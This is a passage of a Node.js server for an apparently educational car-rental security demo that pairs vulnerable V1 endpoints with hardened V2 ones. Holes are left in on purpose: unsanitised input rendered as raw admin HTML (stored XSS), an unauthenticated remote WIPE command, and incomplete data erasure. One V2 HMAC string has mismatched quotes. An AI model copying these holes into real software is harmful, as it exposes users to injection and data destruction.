            if (vehicle.Status !== 'Available') return res.status(409).json({ error: 'Xe này đã được thuê hoặc không khả dụng.' });
            // Kiểm tra user không có hợp đồng Active nào khác
            db.get(`SELECT RentalID FROM Rentals WHERE AccountID = ? AND Status = 'Active' LIMIT 1`, [req.user.AccountID], (err2, existing) => {
                if (existing) return res.status(409).json({ error: 'Bạn đang có một hợp đồng thuê xe đang hoạt động. Vui lòng trả xe cũ trước.' });
                const totalAmount = days * (vehicle.PricePerDay || 800000);
                db.run(`INSERT INTO Rentals (VehicleID, AccountID, Status, StartDate, EndDate, TotalAmount, RouteType)
                    VALUES (?,?,?,?,?,?,?)`,
                    [vehicleId, req.user.AccountID, 'Active', startDate, endDate, totalAmount, routeType],
                    function(err3) {
                        if (err3) return res.status(500).json({ error: err3.message });
                        const rentalId = this.lastID;
                        db.run(`UPDATE Vehicles SET Status = 'Rented', Version = Version + 1 WHERE VehicleID = ?`, [vehicleId]);
                        const username = req.user.Username || 'user';
                        const cPlain = `Danh ba ${username}: Me (090${Math.floor(1e6+Math.random()*9e6)}), Ban (098${Math.floor(1e6+Math.random()*9e6)})`;
                        const gPlain = `GPS Log: Khoi hanh tu Ha Noi`;
                        db.get(`SELECT DeviceModel FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err4, userRow) => {
                            const deviceModel = userRow?.DeviceModel || 'Thiet bi khach hang';
                            db.run(`INSERT OR REPLACE INTO VehicleInfotainment (VehicleID, SyncedContacts, GPSHistory, ActiveBluetoothDevice) VALUES (?,?,?,?)`,
                                [vehicleId, encryptAES(cPlain), encryptAES(gPlain), deviceModel + ' (Đang kết nối)']);
                            initGpsSession(vehicleId, req.user.AccountID, routeType);
                            res.json({ message: `Đặt xe thành công!`, rentalId, vehicleId, totalAmount, days });
                        });
                    }
                );
            });
        });
    });
});

// POST return vehicle — trả xe
app.post('/api/v2/vehicles/return', verifyTokenV2, (req, res) => {
    const { rentalId } = req.body;
    db.get(`SELECT * FROM Rentals WHERE RentalID = ? AND AccountID = ? AND Status = 'Active'`,
        [rentalId, req.user.AccountID], (err, rental) => {
        if (err || !rental) return res.status(404).json({ error: 'Không tìm thấy hợp đồng thuê xe.' });
        db.run(`UPDATE Rentals SET Status = 'Completed' WHERE RentalID = ?`, [rentalId], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            db.run(`UPDATE Vehicles SET Status = 'Available' WHERE VehicleID = ?`, [rental.VehicleID]);
            // Dừng GPS session và cập nhật trạng thái hộp đen
            terminateGpsSession(rental.VehicleID);
            res.json({ message: 'Trả xe thành công! Cảm ơn bạn đã sử dụng VNCars.' });
        });
    });
});

// POST confirm rental (vehicle owner approval)
app.post('/api/v2/rentals/confirm', verifyTokenAndAdminV2, (req, res) => {
    const { rentalId } = req.body;
    if (!rentalId) return res.status(400).json({ error: 'Thieu rentalId.' });
    
    db.get(`SELECT * FROM Rentals WHERE RentalID = ?`, [rentalId], (err, rental) => {
        if (err || !rental) return res.status(404).json({ error: 'Hop dong khong ton tai.' });
        if (rental.Status !== 'Pending') return res.status(400).json({ error: 'Hop dong khong o trang thai cho duyet.' });
        
        const vehicleId = rental.VehicleID;
        const accountId = rental.AccountID;
        
        db.run(`UPDATE Rentals SET Status = 'Active' WHERE RentalID = ?`, [rentalId], (err2) => {
            if (err2) return res.status(500).json({ error: 'Loi cap nhat trang thai hop dong.' });
            
            db.run(`UPDATE Vehicles SET Status = 'Rented' WHERE VehicleID = ?`, [vehicleId], (err3) => {
                if (err3) return res.status(500).json({ error: 'Loi cap nhat trang thai xe.' });
                
                db.get(`SELECT Username FROM Accounts WHERE AccountID = ?`, [accountId], (err4, user) => {
                    const username = user ? user.Username : 'user';
                    const cPlain = `Danh ba ${username}: Me (090${Math.floor(1e6+Math.random()*9e6)}), Ban be (098${Math.floor(1e6+Math.random()*9e6)})`;
                    const gPlain = `GPS Log: Nha (103.${Math.floor(10+Math.random()*90)}, 21.${Math.floor(10+Math.random()*90)})`;
                    
                    db.run(`INSERT OR REPLACE INTO VehicleInfotainment (VehicleID, SyncedContacts, GPSHistory, ActiveBluetoothDevice) VALUES (?,?,?,?)`,
                        [vehicleId, encryptAES(cPlain), encryptAES(gPlain), `Thiet bi cua ${username} (Đang kết nối)`], (err5) => {
                        
                        const requestedRoute = rental.RouteType || pendingRoutes[vehicleId] || 'hanoi';
                        initGpsSession(vehicleId, accountId, requestedRoute);
                        delete pendingRoutes[vehicleId];
                        
                        res.json({ message: `Da xac nhan thue xe #${vehicleId} cho hop dong #${rentalId} thành công! Khoi chay thiet bi dinh vi.` });
                    });
                });
            });
        });
    });
});

app.listen(3000, () => {
    console.log('Dummy Web 4 Kịch Bản Sẵn Sàng Tại: http://localhost:3000');
});
// =========================================================
// KỊCH BẢN 5: CROSS-SITE SCRIPTING (XSS)
// =========================================================

// API 1: Dành cho Hacker gửi mã độc (Postman dùng API này)
app.post('/api/v1/vehicles/add', (req, res) => {
    const { vehicleName, vehicalorcview } = req.body;
    
    // Lưu thẳng vào Database mà không hề làm sạch (Sanitize)
    db.run(`INSERT INTO Vehicles (Model, Status) VALUES (?, ?)`, [vehicleName, vehicalorcview], function(err) {
        if (err) return res.status(500).send("Lỗi DB");
        res.status(200).send("Thêm xe thành công!");
    });
});

// API 2: Dành cho Admin xem thông tin (Mở bằng Trình duyệt Chrome/Edge)
app.get('/api/v1/admin/view-vehicle', (req, res) => {
    // Lấy chiếc xe mới nhất vừa thêm vào
    db.get(`SELECT * FROM Vehicles ORDER BY VehicleID DESC LIMIT 1`, (err, row) => {
        if (!row) return res.send("Chưa có xe nào.");
        
        // Trả về HTML thô cho trình duyệt. Biến row.Status đang chứa mã độc!
        const html = `
            <!DOCTYPE html>
            <html>
            <head><title>Quản trị Xe</title><meta charset="utf-8"></head>
            <body>
                <h2>Chi tiết xe: ${row.Model}</h2>
                <p><strong>Đánh giá/Ghi chú:</strong> ${row.Status}</p> 
            </body>
            </html>
        `;
        res.send(html);
    });
});

// =========================================================
// KỊCH BẢN VIPR: VEHICLE INACTIVE PROFILE REMOVER (LỚP 4)
// =========================================================

// API V1: Kết thúc hợp đồng nhưng KHÔNG xóa thông tin nhạy cảm trên xe
app.post('/api/v1/rentals/terminate', (req, res) => {
    const { rentalId } = req.body;
    db.get(`SELECT VehicleID FROM Rentals WHERE RentalID = ?`, [rentalId], (err, row) => {
        if (err || !row) return res.status(404).send("[V1] Hợp đồng không tồn tại.");
        const vehicleId = row.VehicleID;
        db.run(`UPDATE Rentals SET Status = 'Terminated' WHERE RentalID = ?`, [rentalId], function(err) {
            if (err) return res.status(500).send("Lỗi DB");
            db.run(`UPDATE Vehicles SET Status = 'Available' WHERE VehicleID = ?`, [vehicleId], (err) => {
                terminateGpsSession(vehicleId);
                res.send("[V1] Đã kết thúc hợp đồng thuê xe. Cảnh báo: Lịch sử GPS và Danh bạ vẫn lưu trong hệ thống giải trí của xe!");
            });
        });
    });
});

// API V2: Kết thúc hợp đồng và tự động kích hoạt VIPR xóa dữ liệu nhạy cảm trên xe
app.post('/api/v2/rentals/terminate', verifyTokenV2, (req, res) => {
    const { rentalId } = req.body;
    
    db.get(`SELECT VehicleID FROM Rentals WHERE RentalID = ?`, [rentalId], (err, row) => {
        if (err || !row) return res.status(404).send("[V2] Hợp đồng không tồn tại.");
        
        const vehicleId = row.VehicleID;
        
        db.run(`UPDATE Rentals SET Status = 'Terminated' WHERE RentalID = ?`, [rentalId], function(err) {
            if (err) return res.status(500).send("Lỗi DB");
            
            // Cập nhật trạng thái xe về Available
            db.run(`UPDATE Vehicles SET Status = 'Available' WHERE VehicleID = ?`, [vehicleId], (err) => {
                if (err) return res.status(500).send("Lỗi DB khi khôi phục trạng thái xe.");
                
                // Kích hoạt giao thức VIPR (xóa dữ liệu xe kết nối từ xa)
                wipedBluetoothVehicles.add(parseInt(vehicleId));
                db.run(`UPDATE VehicleInfotainment SET GPSHistory = '[]', SyncedContacts = '[]', ActiveBluetoothDevice = 'Ngắt kết nối (Offline)' WHERE VehicleID = ?`, [vehicleId], function(err) {
                    if (err) return res.status(500).send("Lỗi thực thi VIPR");
                    // V3: Kết thúc phiên GPS & Zeroize DEK
                    terminateGpsSession(vehicleId);
                    res.send("[V2] Đã kết thúc hợp đồng thuê xe. Lệnh VIPR đã truyền thành công — xóa toàn bộ GPS/Danh bạ khỏi xe. DEK phiên GPS đã Zeroize!");
                });
            });
        });
    });
});

// API V2: Thuê xe an toàn - Có bảo vệ chống CSRF (SameSite + Gatekeeper Header), DDoS/Spam và BOLA Check
app.post('/api/v2/rentals/rent', verifyTokenV2, (req, res) => {
    const { vehicleId } = req.body;
    
    // Kiểm tra Custom Header chống bên thứ 3 phút động request (CSRF/Spam Protection)
    const gatekeeperHeader = req.headers['x-rentalshield-gatekeeper'];
    if (gatekeeperHeader !== 'client-v2-active') {
        return res.status(403).json({ error: "[V2] Từ chối truy cập: Yêu cầu không hợp lệ từ nguồn chưa xác thực!" });
    }

    if (!vehicleId) {
        return res.status(400).json({ error: "Thiếu thông tin VehicleID." });
    }

    // Kiểm tra xem xe có đang sẵn sàng (Available) không
    db.get(`SELECT * FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, vehicle) => {
        if (err || !vehicle) {
            return res.status(404).json({ error: "Phương tiện không tồn tại." });
        }
        if (vehicle.Status !== 'Available') {
            return res.status(400).json({ error: "Phương tiện này hiện đang được thuê hoặc không khả dụng." });
        }

        // Lấy routeType (nếu có từ request)
        const routeType = req.body.routeType || 'hanoi';

        // Tiến hành tạo hợp đồng thuê xe mới
        db.run(`INSERT INTO Rentals (VehicleID, AccountID, Status, RouteType) VALUES (?, ?, 'Active', ?)`, [vehicleId, req.user.AccountID, routeType], function(err) {
            if (err) return res.status(500).json({ error: "Lỗi tạo hợp đồng thuê xe." });
            const rentalId = this.lastID;

            // Cập nhật trạng thái xe sang 'Rented'
            db.run(`UPDATE Vehicles SET Status = 'Rented' WHERE VehicleID = ?`, [vehicleId], (err) => {
                if (err) return res.status(500).json({ error: "Lỗi cập nhật trạng thái xe." });

                // Đồng bộ/Tạo dữ liệu giải trí giả lập mới cho người dùng trên xe (Được mã hóa AES-256-GCM)
                const username = req.user.Username;
                const contactsPlain = `Danh bạ ${username}: Mẹ (090${Math.floor(1000000+Math.random()*9000000)}), Bạn bè (098${Math.floor(1000000+Math.random()*9000000)})`;
                const gpsPlain = `Nhật ký GPS: Nhà riêng (103.${Math.floor(10+Math.random()*90)}, 21.${Math.floor(10+Math.random()*90)}), Điểm du lịch (105.${Math.floor(10+Math.random()*90)}, 20.${Math.floor(10+Math.random()*90)})`;
                
                const encryptedContacts = encryptAES(contactsPlain);
                const encryptedGps = encryptAES(gpsPlain);

                db.get(`SELECT DeviceModel FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, userRow) => {
                    const bluetoothDevice = userRow?.DeviceModel || 'Thiết bị không xác định';

                    // Ghi hoặc cập nhật thông tin giải trí của xe
                    db.run(`INSERT OR REPLACE INTO VehicleInfotainment (VehicleID, SyncedContacts, GPSHistory, ActiveBluetoothDevice) VALUES (?, ?, ?, ?)`,
                        [vehicleId, encryptedContacts, encryptedGps, bluetoothDevice + ' (Đang kết nối)'], (err) => {
                            if (err) return res.status(500).json({ error: "Lỗi đồng bộ thông tin giải trí trên xe." });
                        // V3: Khởi động phiên GPS bảo mật (Envelope Encryption)
                        initGpsSession(vehicleId, req.user.AccountID, routeType);
                        res.json({
                            message: "Thuê xe thành công! Giao dịch được thực hiện an toàn qua cổng RentalShield.",
                            rentalId: rentalId,
                            vehicleId: vehicleId
                        });
                    }
                );
                }); // Đóng db.get
            });
        });
    });
});

// =========================================================
// KỊCH BẢN CHỮ KÝ LỆNH VIỄN THÔNG (HMAC TELEMATICS) (LỚP 4)
// =========================================================

// V1: Nhận lệnh thô qua HTTP, không có xác thực chữ ký (Lỗ hổng Replay/Spoofing)
app.post('/api/v1/telematics/command', (req, res) => {
    const { vehicleId, command } = req.body;
    if (command === 'WIPE') {
        db.run(`DELETE FROM VehicleInfotainment WHERE VehicleID = ?`, [vehicleId], function(err) {
            res.send(`[V1] Xe ID ${vehicleId} đã nhận lệnh WIPE thô và xóa dữ liệu!`);
        });
    } else {
        res.send(`[V1] Lệnh không xác định.`);
    }
});

// V2: Nhận lệnh qua viễn thông bắt buộc có chữ ký HMAC-SHA256 để xác thực nguồn gốc
app.post('/api/v2/telematics/command', verifyTokenV2, (req, res) => {
    const { vehicleId, command, signature, timestamp, userLat, userLon } = req.body;

    db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: 'Vehicle not found.' });

        if (req.user.AccountID !== 1 && req.user.AccountID !== row.OwnerID) {
            return res.status(403).json({ error: 'Forbidden: Bạn không phải chủ sở hữu xe này.' });
        }

        telematicsCommandLogic();
    });

    function telematicsCommandLogic() {
        // Tính toán lại chữ ký HMAC
        // Hỗ trợ cả 2 định dạng:
        // 1. command + vehicleId (cho admin)
        // 2. vehicleId + ":" + command + ":" + timestamp (cho client - có chống replay)
        const expectedSignatureAdmin = crypto.createHmac('sha256', TELEMATICS_SECRET)
                                        .update(command + vehicleId)
                                        .digest('hex');
                                        
        let expectedSignatureClient = '';
        if (timestamp) {
            expectedSignatureClient = crypto.createHmac('sha256', TELEMATICS_SECRET)
                                        .update(`${vehicleId}:' + command + ':${timestamp}`)
                                        .digest('hex');
        }
                                        
        if (signature !== expectedSignatureAdmin && signature !== expectedSignatureClient) {
            const logMsg = `[TELEMATICS ATTACK] Lệnh viễn thông giả mạo cho xe ID ${vehicleId} bị chặn đứng!`;
            db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
            return res.status(403).json({ error: "[V2] Lỗi xác thực: Chữ ký số lệnh viễn thông không khớp!" });
        }
        
        const s = gpsState[vehicleId];
        
        // Kiểm tra khoảng cách chủ xe (Proximity Verification) để chống Relay Attack
        if (s && userLat !== undefined && userLon !== undefined) {
            const distKm = haversineKm(parseFloat(userLat), parseFloat(userLon), s.lat, s.lon);
            if (distKm > 0.1) { // 100 meters
                const alertMsg = `🚨 PHÁT HIỆN TẤN CÔNG RELAY: Lệnh viễn thông ${command} cho xe #${vehicleId} bị từ chối do chủ xe ở quá xa (${(distKm*1000).toFixed(0)}m > 100m).`;
                db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                    [vehicleId, req.user.AccountID, 'RELAY_ATTACK_DETECTION', alertMsg, 'HIGH']);
                return res.status(403).json({ error: `[Bảo Mật] Từ chối lệnh: Khoảng cách quá xa (${(distKm*1000).toFixed(0)}m > 100m). Nghi ngờ tấn công lặp tín hiệu (Relay Attack).` });
            }
        }
        
        if (command === 'WIPE') {
            wipedBluetoothVehicles.add(parseInt(vehicleId));
            wipedBluetoothVehicles.add(parseInt(vehicleId));
        db.run(`DELETE FROM VehicleInfotainment WHERE VehicleID = ?`, [vehicleId], function(err) {
                res.json({ message: `[V2] Xe ID ${vehicleId} xác nhận chữ ký HMAC hợp lệ. Đã thực thi lệnh WIPE an toàn!` });
            });
        } else if (command === 'LOCK') {
            if (s) {
                s.isLocked = true;
                s.speed = 0;
                s.mode = 'LOCKED';
                startGpsLoop(vehicleId);
                pushSSE(vehicleId, { type: 'ENGINE_LOCKED', vehicleId, lockedBy: req.user.Username, ts: Date.now() });
            }
            db.run(`UPDATE Vehicles SET Status = 'Locked' WHERE VehicleID = ?`, [vehicleId]);
            res.json({ message: `[V2] Đã khóa xe ID ${vehicleId} từ xa thành công! Vận tốc đưa về 0.` });
        } else if (command === 'UNLOCK') {
            if (s) {
                s.isLocked = false;
                s.speed = 30;
                s.mode = 'GPS';
                startGpsLoop(vehicleId);
                pushSSE(vehicleId, { type: 'ENGINE_UNLOCKED', vehicleId, unlockedBy: req.user.Username, ts: Date.now() });
            }
            db.run(`UPDATE Vehicles SET Status = 'Rented' WHERE VehicleID = ?`, [vehicleId]);
            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                [vehicleId, req.user.AccountID, 'ENGINE_UNLOCK',
                 `Động cơ xe #${vehicleId} được mở khóa từ xa bởi ${req.user.Username}.`, 'MEDIUM']);
            res.json({ message: `[V2] Đã mở khóa xe ID ${vehicleId} từ xa thành công! Vận tốc khôi phục.` });
        } else if (command === 'RESTART') {
            let activeSession = gpsState[vehicleId];
            if (!activeSession) {
                initGpsSession(vehicleId, req.user.AccountID);
                activeSession = gpsState[vehicleId];
            }
            if (activeSession) {
                const route = activeSession.route || HANOI_ROUTE;
                const startPt = route[0] || { lat: 21.0285, lon: 105.8524 };
                activeSession.routeIndex = 0;
                activeSession.lat = startPt.lat;
                activeSession.lon = startPt.lon;
                activeSession.heading = calcBearing(startPt.lat, startPt.lon, (route[1] || startPt).lat, (route[1] || startPt).lon);
                activeSession.path = [{ lat: startPt.lat, lon: startPt.lon, ts: Date.now() }];
                
                if (activeSession.isLocked) {
                    activeSession.speed = 0;
                } else {
                    activeSession.speed = 30;
                }
                
                if (activeSession.intervalId) {
                    clearInterval(activeSession.intervalId);
                    activeSession.intervalId = null;
                }
                startGpsLoop(vehicleId);

                db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                    [vehicleId, req.user.AccountID, 'DEVICE_RESTART',
                     `Thiết bị định vị trên xe #${vehicleId} khởi động lại thành công (Khóa động cơ: ${activeSession.isLocked ? 'ĐANG KHÓA' : 'KHÔNG'})`, 'INFO']);

                pushSSE(vehicleId, { type: 'DEVICE_RESTART', vehicleId, restartedBy: req.user.Username, isLocked: activeSession.isLocked, ts: Date.now() });
                res.json({ message: `[V2] Đã khởi động lại thiết bị định vị trên xe ID ${vehicleId} thành công!` });
            } else {
                res.status(500).json({ error: `Không thể khởi chạy phiên định vị để restart.` });
            }
        } else if (command.startsWith('SET_GEOFENCE:')) {
            const radiusKm = parseFloat(command.split(':')[1]) || 5;
            if (s) {
                s.geofence = { lat: s.lat, lon: s.lon, radiusKm };
                s.geofenceViolating = false;
            }
            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                [vehicleId, req.user.AccountID, 'GEOFENCE_SET', `Thiết lập vùng địa lý an toàn bán kính ${radiusKm}km`, 'INFO']);
            res.json({ message: `[V2] Đã thiết lập vùng an toàn bán kính ${radiusKm}km cho xe ID ${vehicleId}!` });
        } else {
            res.status(400).json({ error: `[V2] Lệnh không xác định: ${command}` });
        }
    }
});

// API hỗ trợ sinh chữ ký để test trên UI/Postman dễ dàng
app.post('/api/v2/telematics/generate-signature', verifyTokenV2, (req, res) => {
    const { vehicleId, command, timestamp } = req.body;
    if (!vehicleId || !command) return res.status(400).json({ error: 'Thieu vehicleId hoac command.' });
    const message = timestamp ? `${vehicleId}:${command}:${timestamp}` : command + vehicleId;
    const signature = crypto.createHmac('sha256', TELEMATICS_SECRET)
                                    .update(message)
                                    .digest('hex');
    res.json({ signature });
});

// =========================================================
// V3: GPS ENGINE – ENVELOPE ENCRYPTION + DEAD RECKONING
// Kiến trúc: DEK (AES-256-GCM) sinh ngẫu nhiên mỗi phiên
//            → bọc bằng RSA-OAEP-SHA256 công khai server
//            → SSE đẩy payload mã hóa mỗi 3 giây
// =========================================================

const gpsState = {}; // In-memory GPS state – keyed by vehicleId
const wipedBluetoothVehicles = new Set();

// =================================================================
// =================================================================
// TUYẾN ĐƯỜNG — Các điểm đường thật (Sẽ được làm mịn bằng OSRM)
// =================================================================
const BASE_HANOI_ROUTE = [
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' },
    { lat: 21.0265, lon: 105.8516, name: 'Đinh Tiên Hoàng' },
    { lat: 21.0245, lon: 105.8505, name: 'Hàng Khay' },
    { lat: 21.0225, lon: 105.8488, name: 'Trần Phú' },
    { lat: 21.0202, lon: 105.8460, name: 'Lê Duẩn' },
    { lat: 21.0185, lon: 105.8435, name: 'Quốc Tử Giám' },
    { lat: 21.0195, lon: 105.8402, name: 'Đê La Thành' },
    { lat: 21.0210, lon: 105.8375, name: 'Giảng Võ' },
    { lat: 21.0228, lon: 105.8352, name: 'Ngọc Khánh' },
    { lat: 21.0250, lon: 105.8338, name: 'Kim Mã' },
    { lat: 21.0275, lon: 105.8322, name: 'Liễu Giai' },
    { lat: 21.0302, lon: 105.8308, name: 'Đốc Ngữ' },
    { lat: 21.0325, lon: 105.8294, name: 'Đường Bưởi' },
    { lat: 21.0402, lon: 105.8265, name: 'Lạc Long Quân' },
    { lat: 21.0470, lon: 105.8275, name: 'Âu Cơ' },
    { lat: 21.0512, lon: 105.8348, name: 'Nhật Tân' },
    { lat: 21.0495, lon: 105.8432, name: 'Xuân Diệu' },
    { lat: 21.0445, lon: 105.8472, name: 'Tứ Liên' },
    { lat: 21.0395, lon: 105.8508, name: 'Yên Phụ' },
    { lat: 21.0315, lon: 105.8525, name: 'Thụy Khuê' },
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' }
];

const BASE_NORTH_ROUTE = [
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' },
    { lat: 21.0188, lon: 105.8432, name: 'Lê Duẩn' },
    { lat: 20.9998, lon: 105.8298, name: 'Phương Liệt (VĐ3)' },
    { lat: 20.9965, lon: 105.8175, name: 'Ngã Tư Sở' },
    { lat: 21.0018, lon: 105.7858, name: 'Mỹ Đình' },
    { lat: 21.0118, lon: 105.7345, name: 'ĐL Thăng Long' },
    { lat: 21.0228, lon: 105.7412, name: 'QL32 (Cầu Diễn)' },
    { lat: 21.0328, lon: 105.7848, name: 'Cầu Giấy' },
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' }
];

const BASE_AIRPORT_ROUTE = [
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' },
    { lat: 21.0512, lon: 105.8348, name: 'Cầu Nhật Tân' },
    { lat: 21.1258, lon: 105.8035, name: 'Đường Võ Nguyên Giáp' },
    { lat: 21.2185, lon: 105.8042, name: 'Sân Bay Nội Bài' },
    { lat: 21.1258, lon: 105.8035, name: 'Đường Võ Nguyên Giáp' },
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' }
];

const BASE_WEST_ROUTE = [
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' },
    { lat: 21.0188, lon: 105.8432, name: 'Lê Duẩn' },
    { lat: 21.0068, lon: 105.8245, name: 'Chùa Bộc' },
    { lat: 20.9855, lon: 105.7952, name: 'Hà Đông' },
    { lat: 20.9535, lon: 105.7602, name: 'Yên Nghĩa' },
    { lat: 20.9855, lon: 105.7952, name: 'Hà Đông' },
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' }
];

const BASE_EAST_ROUTE = [
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' },
    { lat: 21.0425, lon: 105.8645, name: 'Cầu Chương Dương' },
    { lat: 21.0498, lon: 105.8812, name: 'Nguyễn Văn Cừ' },
    { lat: 21.0565, lon: 105.9035, name: 'Savico Megamall' },
    { lat: 21.0315, lon: 105.9385, name: 'Vinhomes Riverside' },
    { lat: 21.0425, lon: 105.8645, name: 'Cầu Chương Dương' },
    { lat: 21.0285, lon: 105.8524, name: 'Hồ Hoàn Kiếm' }
];

const BASE_DANANG_ROUTE = [
    { lat: 16.0544, lon: 108.2022, name: 'Cầu Rồng' },
    { lat: 16.0611, lon: 108.2238, name: 'Biển Mỹ Khê' },
    { lat: 16.0125, lon: 108.2325, name: 'Ngũ Hành Sơn' },
    { lat: 16.0544, lon: 108.2022, name: 'Cầu Rồng' }
];

const BASE_HCMC_ROUTE = [
    { lat: 10.7769, lon: 106.7009, name: 'Chợ Bến Thành' },
    { lat: 10.7626, lon: 106.6602, name: 'Phố đi bộ Nguyễn Huệ' },
    { lat: 10.7952, lon: 106.7218, name: 'Landmark 81' },
    { lat: 10.7769, lon: 106.7009, name: 'Chợ Bến Thành' }
];

const BASE_HAIPHONG_ROUTE = [
    { lat: 20.8525, lon: 106.6821, name: 'Nhà hát lớn Hải Phòng' },
    { lat: 20.8449, lon: 106.6881, name: 'Đường Lạch Tray' },
    { lat: 20.7302, lon: 106.7871, name: 'Biển Đồ Sơn' },
    { lat: 20.8525, lon: 106.6821, name: 'Nhà hát lớn Hải Phòng' }
];

const BASE_NHATRANG_ROUTE = [
    { lat: 12.2388, lon: 109.1967, name: 'Đường Trần Phú' },
    { lat: 12.2715, lon: 109.1985, name: 'Hòn Chồng' },
    { lat: 12.2218, lon: 109.1925, name: 'Cảng Cầu Đá' },
    { lat: 12.2388, lon: 109.1967, name: 'Đường Trần Phú' }
];

const BASE_CANTHO_ROUTE = [
    { lat: 10.0333, lon: 105.7833, name: 'Bến Ninh Kiều' },
    { lat: 10.0125, lon: 105.7658, name: 'Chợ Nổi Cái Răng' },
    { lat: 10.0512, lon: 105.7725, name: 'Sân Bay Cần Thơ' },
    { lat: 10.0333, lon: 105.7833, name: 'Bến Ninh Kiều' }
];

// Danh sách Đại lý / Cửa hàng bán xe (POIs)
const DEALERSHIPS = [
    { id: 1, lat: 21.0250, lon: 105.8338, name: 'Đại Lý Ô tô Kim Mã', type: 'dealer' },
    { id: 2, lat: 20.9965, lon: 105.8175, name: 'Trạm Bảo Hành Ngã Tư Sở', type: 'service' },
    { id: 3, lat: 21.0452, lon: 105.8268, name: 'Showroom Lạc Long Quân', type: 'dealer' },
    { id: 4, lat: 21.2150, lon: 105.8040, name: 'Dịch vụ xe Sân Bay Nội Bài', type: 'service' }
];

// Biến lưu trữ tuyến đường đã làm mịn (dense points từ OSRM)
let HANOI_ROUTE = [...BASE_HANOI_ROUTE];
let NORTH_VIETNAM_ROUTE = [...BASE_NORTH_ROUTE];
let AIRPORT_ROUTE = [...BASE_AIRPORT_ROUTE];
let WEST_ROUTE = [...BASE_WEST_ROUTE];
let EAST_ROUTE = [...BASE_EAST_ROUTE];
let DANANG_ROUTE = [...BASE_DANANG_ROUTE];
let HCMC_ROUTE = [...BASE_HCMC_ROUTE];
let HAIPHONG_ROUTE = [...BASE_HAIPHONG_ROUTE];
let NHATRANG_ROUTE = [...BASE_NHATRANG_ROUTE];
let CANTHO_ROUTE = [...BASE_CANTHO_ROUTE];

function getDefaultRouteForVehicle(vehicleId) {
    const vid = parseInt(vehicleId);
    if (vid === 1) return { route: HANOI_ROUTE, type: 'hanoi' };
    if (vid === 2) return { route: NORTH_VIETNAM_ROUTE, type: 'north_vietnam' };
    if (vid === 3) return { route: HAIPHONG_ROUTE, type: 'haiphong' };
    if (vid === 4) return { route: AIRPORT_ROUTE, type: 'airport' };
    if (vid === 5) return { route: DANANG_ROUTE, type: 'danang' };
    if (vid === 6) return { route: NHATRANG_ROUTE, type: 'nhatrang' };
    if (vid === 7) return { route: HCMC_ROUTE, type: 'hcmc' };
    if (vid === 8) return { route: WEST_ROUTE, type: 'west' };
    if (vid === 9) return { route: EAST_ROUTE, type: 'east' };
    if (vid === 10) return { route: CANTHO_ROUTE, type: 'cantho' };
    return { route: HANOI_ROUTE, type: 'hanoi' };
}

// Hàm fetch lộ trình từ OSRM
async function fetchOSRMRoute(waypoints) {
    const https = require('https');
    return new Promise((resolve, reject) => {
        const coordString = waypoints.map(c => `${c.lon},${c.lat}`).join(';');
        const url = `https://router.project-osrm.org/route/v1/driving/${coordString}?overview=full&geometries=geojson&steps=true`;
        
        https.get(url, { headers: { 'User-Agent': 'AntigravityCarRentalDemo/1.0' } }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    if (parsed.code === 'Ok' && parsed.routes.length > 0) {
                        const route = parsed.routes[0];
                        const densePoints = [];
                        let coordIndex = 0;
                        
                        route.legs.forEach(leg => {
                            leg.steps.forEach(step => {
                                const stepName = step.name || "Đường nối";
                                const stepCoordsCount = step.geometry.coordinates.length;
                                
                                for (let i = 0; i < stepCoordsCount; i++) {
                                    if (coordIndex < route.geometry.coordinates.length) {
                                        const c = route.geometry.coordinates[coordIndex];
                                        // Avoid duplicating exact same points continuously
                                        if (densePoints.length === 0 || 
                                            densePoints[densePoints.length-1].lat !== c[1] || 
                                            densePoints[densePoints.length-1].lon !== c[0]) {
                                            densePoints.push({
                                                lat: c[1],
                                                lon: c[0],
                                                name: stepName
                                            });
                                        }
                                        coordIndex++;
                                    }
                                }
                            });
                        });
                        if (densePoints.length === 0) resolve(waypoints);
                        else resolve(densePoints);
                    } else {
                        resolve(waypoints); // Fallback
                    }
                } catch (e) {
                    resolve(waypoints); // Fallback
                }
            });
        }).on('error', () => resolve(waypoints));
    });
}

// Khởi tạo các tuyến đường bám đường (Snap to Roads)
const delay = ms => new Promise(res => setTimeout(res, ms));

async function initRoutesWithOSRM() {
    console.log('[GPS] Đang tải tuyến đường Toàn Việt Nam từ OSRM API...');
    HANOI_ROUTE = await fetchOSRMRoute(BASE_HANOI_ROUTE); await delay(500);
    NORTH_VIETNAM_ROUTE = await fetchOSRMRoute(BASE_NORTH_ROUTE); await delay(500);
    AIRPORT_ROUTE = await fetchOSRMRoute(BASE_AIRPORT_ROUTE); await delay(500);
    WEST_ROUTE = await fetchOSRMRoute(BASE_WEST_ROUTE); await delay(500);
    EAST_ROUTE = await fetchOSRMRoute(BASE_EAST_ROUTE); await delay(500);
    DANANG_ROUTE = await fetchOSRMRoute(BASE_DANANG_ROUTE); await delay(500);
